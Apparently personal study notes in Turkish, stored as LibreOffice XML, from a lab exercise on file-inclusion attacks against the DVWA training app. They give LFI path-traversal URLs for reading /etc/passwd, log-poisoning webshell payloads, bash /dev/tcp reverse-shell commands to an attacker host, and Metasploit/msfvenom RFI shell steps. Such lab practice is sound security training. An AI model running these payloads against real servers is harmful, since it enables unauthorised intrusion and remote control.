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3a6e8b" officeooo:paragraph-rsid="003a6e8b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3b1b87" officeooo:paragraph-rsid="003b1b87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3b1b87" officeooo:paragraph-rsid="003ddb0f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3d0099" officeooo:paragraph-rsid="003b1b87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3ddb0f" officeooo:paragraph-rsid="003ddb0f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3ddb0f" officeooo:paragraph-rsid="003ebb17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c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="003ddb0f" officeooo:paragraph-rsid="003ddb0f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color="#c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="003ddb0f" officeooo:paragraph-rsid="003ebb17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3ebb17" officeooo:paragraph-rsid="003ebb17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3ef70f" officeooo:paragraph-rsid="003ef70f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c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="003ddb0f" officeooo:paragraph-rsid="003ef70f" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="003ddb0f"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties officeooo:rsid="003ebb17"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties officeooo:rsid="003ef7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FI ile Path Traversal – Hassas Dosya Okuma</text:p>
      <text:p text:style-name="P5">DVWA <text:s/>&gt; file-inlusion</text:p>
      <text:p text:style-name="P5">URL de include.php gördük</text:p>
      <text:p text:style-name="P5">amacımız, path içinde gezerek, dosya okutmak.</text:p>
      <text:p text:style-name="P2">http://10.10.10.22/dvwa/vulnerabilities/fi/?page=include.php</text:p>
      <text:p text:style-name="P3">http://10.10.10.22/dvwa/vulnerabilities/fi/?page=../../../../<text:span text:style-name="T1">etc/passwd</text:span></text:p>
      <text:p text:style-name="P2">/<text:span text:style-name="T1">etc/passwd</text:span></text:p>
      <text:p text:style-name="P5"><text:a xlink:type="simple" xlink:href="../../../../../etc/paswd" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">file:///etc/paswd</text:a></text:p>
      <text:p text:style-name="P5"><text:a xlink:type="simple" xlink:href="../../../../../var/www/dvwa/robots.txt" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">file:///var/www/dvwa/robots.txt</text:a></text:p>
      <text:p text:style-name="P5"><text:a xlink:type="simple" xlink:href="file://proc_version/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">/proc_version</text:a></text:p>
      <text:p text:style-name="P5">/proc/net/arp</text:p>
      <text:p text:style-name="P5">/proc/sched_debug <text:s/>(zamanlanmış prog. Var mı)</text:p>
      <text:p text:style-name="P5">/proc/mounts</text:p>
      <text:p text:style-name="P5">/proc/net/route</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">OWASP 2013 &gt; A3 &gt; First Order &gt; Arbitary File İnclusion</text:p>
      <text:p text:style-name="P5">/etc/issue</text:p>
      <text:p text:style-name="P5">/etc/group</text:p>
      <text:p text:style-name="P5">/etc/resolv.conf</text:p>
      <text:p text:style-name="P5">index.php</text:p>
      <text:p text:style-name="P5">sonuna <text:s/>%00 veya ? <text:s/>Ifadesi koyarak kaçılabilir. İfadede değişiklik olmaz.</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P8">LFI – <text:span text:style-name="T2">log Poisoning ile Shell Alma</text:span></text:p>
      <text:p text:style-name="P6">OWASP 2013 &gt; A3 &gt; First Order &gt; Arbitary File İnclusion</text:p>
      <text:p text:style-name="P6">/<text:span text:style-name="T2">usr/local/apache/logs/access.log</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">└─# ssh <text:a xlink:type="simple" xlink:href="mailto:root@10.10.10.22" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">root@10.10.10.22</text:a></text:p>
      <text:p text:style-name="P10">ssh login aldık, </text:p>
      <text:p text:style-name="P10">cat /var/log/apache2/access.log</text:p>
      <text:p text:style-name="P10">chmod a+rx /var/log/apache2/</text:p>
      <text:p text:style-name="P10">chmod a+rx /var/log/apache2/*</text:p>
      <text:p text:style-name="P10">ls -l /var/log/apache2/</text:p>
      <text:p text:style-name="P10">çağırdığımızda dosyayı okuyabiliyoruz.</text:p>
      <text:p text:style-name="P10">Yanlış bir aratma yapıp , access.log dan yaptığımız aratmayı bulabiliyoruz.</text:p>
      <text:p text:style-name="P10">Tail -f /var/log/apache2/access.log <text:s/>ile canlı olarak takip edebiliriz.</text:p>
      <text:p text:style-name="P10">Interceptte bulmak için access.log için fail bi aratma yaptık.</text:p>
      <text:p text:style-name="P10">UserAgent : <text:s/>yerine..</text:p>
      <text:p text:style-name="P10">&lt;?php echo system ($_GET[‘bye’]); ?&gt;</text:p>
      <text:p text:style-name="P10">bu sayede, bye ismiyle bir get metodu çağrılırsa, system dosyalarını okuyabiliriz. Demektir.</text:p>
      <text:p text:style-name="P10">Page=…..&amp;bye=bin/bash -c ‘bash -i’ &gt; /dev/tcp/10.10.10.80/4455 0&gt;%26%31’ <text:s/></text:p>
      <text:p text:style-name="P10">0&gt; dan sonra &amp;1 kullanacaktık ama encoding yapmamız lazım.</text:p>
      <text:p text:style-name="P10">Port 4455 I açmadan önce, </text:p>
      <text:p text:style-name="P10">nc -lvp 4455 ile o portu dinleyip shell alacağız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LFI – <text:span text:style-name="T2">log Poisoning ile Shell Alma </text:span><text:span text:style-name="T3">2</text:span></text:p>
      <text:p text:style-name="P10">ssh ile sahte girişler deneyip loga düşeceğiz.</text:p>
      <text:p text:style-name="P10">Sonra ssh ile root ile girip, <text:s/>cat /var/log/auth.log <text:s/></text:p>
      <text:p text:style-name="P10">dan sahte girişlerimizi gördük</text:p>
      <text:p text:style-name="P10">cd /var/log</text:p>
      <text:p text:style-name="P10">ls</text:p>
      <text:p text:style-name="P10">ls -l auth.log</text:p>
      <text:p text:style-name="P10">auth.log u okuma hakkımız yok.</text:p>
      <text:p text:style-name="P10">Chmod a+rx auth.log</text:p>
      <text:p text:style-name="P10">Chmod a+rx /var/log</text:p>
      <text:p text:style-name="P10">tail -f auth.log <text:s text:c="2"/>(dinlemeye bıraktık.)</text:p>
      <text:p text:style-name="P10">eş zamanlı olarak zehirleyeceğiz..</text:p>
      <text:p text:style-name="P10">ssh ‘&lt;?php system($_GET[‘astalavista’]); ?&gt;’@10.10.10.22</text:p>
      <text:p text:style-name="P10">URL de ,, page=/var/log/auth.log&amp;astalavista=pwd </text:p>
      <text:p text:style-name="P10">komutu çalıştırabiliyoruz.</text:p>
      <text:p text:style-name="P10">Astalavista=/bin/bash -c ‘bash -i &gt; /dev/tcp/10.10.10.80/4466 0&gt;%261’</text:p>
      <text:p text:style-name="P10">nc -lvp 4466 <text:s/>dinlemeye başlayıp kodu çalıştırınca shell alıyoruz.</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P11"><text:span text:style-name="T3">R</text:span>FI – <text:span text:style-name="T3">URL Redirect ve URL Include</text:span></text:p>
      <text:p text:style-name="P10">DVWA &gt; File Inclusion</text:p>
      <text:p text:style-name="P10">10.10.10.22/dvwa/vulnerabilities/fi/?page=https://google.com</text:p>
      <text:p text:style-name="P10">hTTps <text:s/>olarak yazabiliriz veya encoding.</text:p>
      <text:p text:style-name="P10">Ssh login aldık.</text:p>
      <text:p text:style-name="P10">Nano /etc/php5/apache2/php.ini</text:p>
      <text:p text:style-name="P10">allow_url_fopen = open <text:s text:c="2"/>yaparsak URL Redirect ve Include yapılabilir.</text:p>
      <text:p text:style-name="P10">Php fonksiyonları ile de açılabilir.</text:p>
      <text:p text:style-name="P10">Msfconsoleuse exploit/multi/script/web_delivery</text:p>
      <text:p text:style-name="P10">set srvhost 10.10.10.80</text:p>
      <text:p text:style-name="P10">set srvprt 8787</text:p>
      <text:p text:style-name="P10">set lhost 10.10.10.80</text:p>
      <text:p text:style-name="P10">set target PHP</text:p>
      <text:p text:style-name="P10">set payload php/meterpreter/reverse_tcp</text:p>
      <text:p text:style-name="P10">run</text:p>
      <text:p text:style-name="P10">target machine de command I çalıştırırsak, işlem tamam.</text:p>
      <text:p text:style-name="P10">/var/log/auth.log&amp;astalavista=msfconsole dan gelen command</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P11"><text:span text:style-name="T3">R</text:span>FI – <text:span text:style-name="T3">Remote Code Execution</text:span></text:p>
      <text:p text:style-name="P10">8989 portundan http.server olduk.</text:p>
      <text:p text:style-name="P10">DVWA girelim File INclusion</text:p>
      <text:p text:style-name="P10">page=10.10.10.22/dvwa/vulnerabilities/fi/?page=hTTp://10.10.10.80:8989/rce.txt</text:p>
      <text:p text:style-name="P10">Desktoptaki rce.txt yi çalıştırmış olduk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3">R</text:span>FI – <text:span text:style-name="T3">Shell Alma</text:span></text:p>
      <text:p text:style-name="P10">└─# msfvenom -p php_reverse_php lhost=10.10.10.80 lport=7788 &gt; ~/Desktop/shell.php</text:p>
      <text:p text:style-name="P10">payload hazır.</text:p>
      <text:p text:style-name="P10">Bu sefer msfconsole dan dinleyelim</text:p>
      <text:p text:style-name="P10">exploit/multi/handler</text:p>
      <text:p text:style-name="P10">set lhost eth0</text:p>
      <text:p text:style-name="P10">set lport 7788</text:p>
      <text:p text:style-name="P10">set payload php/reverse_php</text:p>
      <text:p text:style-name="P10">run <text:s/>(dinlemedeyiz)</text:p>
      <text:p text:style-name="P10">http.server olduk</text:p>
      <text:p text:style-name="P10">Fİle Inclusion açığı olan bir yere, http.server olarak shell.php yi serv ediyoruz.</text:p>
      <text:p text:style-name="P10">Shell aldık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2T12:01:51.707052303</dc:date>
    <meta:editing-duration>PT11H19M32S</meta:editing-duration>
    <meta:editing-cycles>33</meta:editing-cycles>
    <meta:generator>LibreOffice/7.4.1.1$Linux_X86_64 LibreOffice_project/40$Build-1</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="4" meta:paragraph-count="91" meta:word-count="381" meta:character-count="3212" meta:non-whitespace-character-count="2895"/>
  </office:meta>
</office:document-meta>
</file>